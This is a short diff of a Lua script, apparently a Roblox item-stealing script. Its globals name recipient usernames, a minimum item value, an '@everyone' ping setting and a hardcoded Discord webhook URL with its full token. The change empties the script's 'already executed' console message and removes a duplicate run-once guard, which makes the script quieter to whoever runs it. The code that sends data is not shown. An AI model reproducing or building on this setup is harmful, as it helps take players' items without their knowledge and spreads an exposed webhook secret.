@@ -1,6 +1,6 @@
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
-    print("Script already executed, exiting")
+    print("")
     return
 end
 _G.scriptExecuted = true
@@ -532,12 +532,6 @@ _G.min_value = 10
 _G.pingEveryone = "Yes"
 _G.webhook = "https://discord.com/api/webhooks/1394832003928428545/TI6Wj8peOmBhp6pseo4NOI0GVWIFjbCHZi5t0Aye0TeJReO4-QXAK1SY0q6t_wwXSBdO"
 
-_G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-    print("Script already executed, exiting")
-    return
-end
-_G.scriptExecuted = true
 
 local users = _G.Usernames or {}
 local min_value = _G.min_value or 10000000
